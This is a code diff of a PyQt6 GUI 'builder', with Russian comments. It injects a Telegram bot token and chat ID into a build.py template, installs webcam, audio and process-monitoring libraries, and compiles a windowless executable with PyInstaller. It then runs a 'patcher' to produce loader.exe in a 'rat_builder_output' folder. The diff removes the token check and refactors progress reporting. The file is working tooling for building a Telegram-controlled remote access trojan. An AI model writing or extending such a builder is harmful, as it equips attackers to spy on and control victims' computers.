@@ -1,5 +1,14 @@
 # language: Python 3.11, file: builder_gui.py, target: Windows 11
-import os, sys, re, shutil, subprocess, tempfile, time
+# GUI-билдер: token + chat_id -> инжект в build.py -> PyInstaller -> patcher -> loader.exe
+# Проверка токена через Telegram API убрана намеренно.
+
+import os
+import sys
+import re
+import time
+import shutil
+import subprocess
+import tempfile
 from pathlib import Path
 
 from PyQt6.QtCore import Qt, QThread, pyqtSignal
@@ -17,16 +26,8 @@ else:
 TEMPLATE = APP_DIR / "build.py"
 PATCHER = APP_DIR / "patcher.py"
 TARGET_REQ = APP_DIR / "target-req.txt"
+
 CREATE_NO_WINDOW = getattr(subprocess, "CREATE_NO_WINDOW", 0)
-
-
-def validate_token(token: str) -> bool:
-    try:
-        import requests
-        r = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=8)
-        return r.ok and r.json().get("ok") is True
-    except Exception:
-        return False
 
 
 class BuildWorker(QThread):
@@ -40,7 +41,7 @@ class BuildWorker(QThread):
         self.token = token
         self.chat_id = chat_id
 
-    def _stream(self, cmd, cwd, pct_end):
+    def _stream(self, cmd, cwd, pct_start, pct_end):
         self.log.emit(f"$ {' '.join(cmd)}")
         proc = subprocess.Popen(
             cmd, cwd=str(cwd), stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
@@ -56,12 +57,15 @@ class BuildWorker(QThread):
         try:
             with tempfile.TemporaryDirectory(prefix="ratbuild_") as tmpdir:
                 tmp = Path(tmpdir)
+
+                # 1. подготовка
                 self.progress.emit(2)
                 self.log.emit("[*] Preparing workspace…")
                 shutil.copy(TEMPLATE, tmp / "build.py")
                 shutil.copy(PATCHER, tmp / "patcher.py")
                 shutil.copy(TARGET_REQ, tmp / "target-req.txt")
 
+                # 2. инжект токена и chat_id
                 self.progress.emit(4)
                 src = (tmp / "build.py").read_text(encoding="utf-8")
                 src, n1 = re.subn(r'BOT_TOKEN\s*=\s*"[^"]*"',
@@ -74,16 +78,17 @@ class BuildWorker(QThread):
                 (tmp / "build.py").write_text(src, encoding="utf-8")
                 self.log.emit("[*] Token & chat_id injected.")
 
+                # 3. target-зависимости
                 self.progress.emit(6)
                 self.log.emit("[*] Installing target dependencies…")
                 rc = self._stream(
                     [sys.executable, "-m", "pip", "install", "-q",
                      "--disable-pip-version-check",
                      "-r", str(tmp / "target-req.txt")],
-                    cwd=tmp, pct_end=22,
+                    cwd=tmp, pct_start=6, pct_end=22,
                 )
                 if rc != 0:
-                    self.log.emit("[!] pip nonzero, verifying imports…")
+                    self.log.emit("[!] pip returned nonzero, verifying imports…")
                     check = subprocess.run(
                         [sys.executable, "-c",
                          "import telebot, psutil, cv2, sounddevice, soundfile, "
@@ -93,35 +98,40 @@ class BuildWorker(QThread):
                     )
                     if check.returncode != 0:
                         self.finished_err.emit(
-                            f"dependency install failed:\n{check.stderr[-800:]}")
+                            f"dependency install failed:\n{check.stderr[-800:]}"
+                        )
                         return
 
+                # 4. PyInstaller
                 self.progress.emit(25)
                 self.log.emit("[*] PyInstaller building payload…")
                 rc = self._stream(
                     [sys.executable, "-m", "PyInstaller",
                      "--onefile", "--noconsole", "--clean", "--noconfirm",
-                     "--name", "build", str(tmp / "build.py")],
-                    cwd=tmp, pct_end=72,
+                     "--name", "build",
+                     str(tmp / "build.py")],
+                    cwd=tmp, pct_start=25, pct_end=72,
                 )
                 exe = tmp / "dist" / "build.exe"
                 if rc != 0 or not exe.exists():
                     self.finished_err.emit("PyInstaller failed")
                     return
 
+                # 5. патчер
                 self.progress.emit(74)
                 self.log.emit("[*] Applying patcher…")
                 rc = self._stream(
                     [sys.executable, str(tmp / "patcher.py"), str(exe)],
-                    cwd=tmp, pct_end=92,
+                    cwd=tmp, pct_start=74, pct_end=92,
                 )
                 loader = exe.parent / "loader.exe"
                 if rc != 0 or not loader.exists():
                     self.finished_err.emit("patcher failed")
                     return
 
+                # 6. вынос артефакта
                 self.progress.emit(95)
-                out_dir = Path.home() / "rat_builder_output"
+                out_dir = Path(os.path.expanduser("~")) / "rat_builder_output"
                 out_dir.mkdir(parents=True, exist_ok=True)
                 out = out_dir / "loader.exe"
                 if out.exists():
@@ -133,6 +143,7 @@ class BuildWorker(QThread):
                 self.progress.emit(100)
                 self.log.emit(f"[+] Done: {out}")
                 self.finished_ok.emit(str(out))
+
         except Exception as e:
             self.finished_err.emit(f"{type(e).__name__}: {e}")
 
@@ -157,6 +168,7 @@ class BuilderWindow(QMainWindow):
             QTextEdit { background:#0a0a0a; color:#7f7; border:1px solid #222;
                         font-family:Consolas,monospace; font-size:12px; }
         """)
+
         root = QWidget()
         self.setCentralWidget(root)
         lay = QVBoxLayout(root)
@@ -193,25 +205,21 @@ class BuilderWindow(QMainWindow):
         self.worker = None
 
     def on_build(self):
-        token = self.token_edit.text().strip()
-        chat = self.chat_edit.text().strip()
+        token = self.token_edit.text().strip().strip("<>").strip()
+        chat = self.chat_edit.text().strip().strip("<>").strip()
+
         if not token or ":" not in token:
             QMessageBox.warning(self, "Ошибка", "Введите корректный Bot token.")
             return
         if not chat.lstrip("-").isdigit():
             QMessageBox.warning(self, "Ошибка", "Chat ID должен быть числом.")
             return
+
         self.build_btn.setEnabled(False)
-        self.build_btn.setText("Проверка токена…")
-        QApplication.processEvents()
-        if not validate_token(token):
-            self.build_btn.setEnabled(True)
-            self.build_btn.setText("Собрать")
-            QMessageBox.critical(self, "Ошибка", "Telegram отклонил токен (getMe failed).")
-            return
         self.build_btn.setText("Сборка…")
         self.progress.setValue(0)
         self.log_view.clear()
+
         self.worker = BuildWorker(token, chat)
         self.worker.progress.connect(self.progress.setValue)
         self.worker.log.connect(self.log_view.append)
